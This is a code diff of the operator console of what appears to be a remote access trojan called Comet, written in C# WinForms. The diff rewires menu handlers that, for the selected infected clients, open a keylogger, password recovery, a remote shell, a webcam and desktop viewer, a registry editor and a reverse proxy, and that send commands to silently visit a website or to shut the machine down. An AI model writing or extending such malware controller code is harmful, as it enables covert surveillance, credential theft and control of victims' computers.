@@ -639,16 +639,6 @@ namespace Comet.Server.Forms
 
         #region "Monitoring"
 
-        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
-                frmRd.Show();
-                frmRd.Focus();
-            }
-        }
-
         private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Client[] clients = GetSelectedClients();
@@ -775,11 +765,6 @@ namespace Comet.Server.Forms
 
         #endregion
 
-        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            GetWebcams();
-        }
-
         void GetWebcams()
         {
             foreach (Client c in GetSelectedClients())
@@ -793,6 +778,192 @@ namespace Comet.Server.Forms
         private void lstClients_MouseDoubleClick(object sender, MouseEventArgs e)
         {
             GetWebcams();
+        }
+
+        private void remoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
+                frmRd.Show();
+                frmRd.Focus();
+            }
+        }
+
+        private void remoteWebcamToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            GetWebcams();
+        }
+
+        private void fileMangToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
+                frmFm.Show();
+                frmFm.Focus();
+            }
+        }
+
+        private void passwordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
+                frmPass.Show();
+            }
+        }
+
+        private void keyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
+                frmKl.Show();
+                frmKl.Focus();
+            }
+        }
+
+        private void showMessageboxToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == DialogResult.OK)
+                    {
+                        foreach (Client c in GetSelectedClients())
+                        {
+                            c.Send(new DoShowMessageBox
+                            {
+                                Caption = frm.MsgBoxCaption,
+                                Text = frm.MsgBoxText,
+                                Button = frm.MsgBoxButton,
+                                Icon = frm.MsgBoxIcon
+                            });
+                        }
+                    }
+                }
+            }
+        }
+
+        private void sendToWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == DialogResult.OK)
+                    {
+                        foreach (Client c in GetSelectedClients())
+                        {
+                            c.Send(new DoVisitWebsite
+                            {
+                                Url = frm.Url,
+                                Hidden = frm.Hidden
+                            });
+                        }
+                    }
+                }
+            }
+        }
+
+        private void systemInformationToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
+                frmSi.Show();
+                frmSi.Focus();
+            }
+        }
+
+        private void taskManagerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
+                frmTm.Show();
+                frmTm.Focus();
+            }
+        }
+
+        private void startupManagerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
+                frmStm.Show();
+                frmStm.Focus();
+            }
+        }
+
+        private void remoteShellToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
+                frmRs.Show();
+                frmRs.Focus();
+            }
+        }
+
+        private void tCPConnectionsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
+                frmCon.Show();
+                frmCon.Focus();
+            }
+        }
+
+        private void registryEditorToolStripMenuItem2_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
+                    frmRe.Show();
+                    frmRe.Focus();
+                }
+            }
+        }
+
+        private void reverseProxyToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
+                frmRs.Show();
+            }
+        }
+
+        private void shutdownToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
+            }
+        }
+
+        private void restartToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
+            }
+        }
+
+        private void standbyToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
+            }
         }
     }
 }
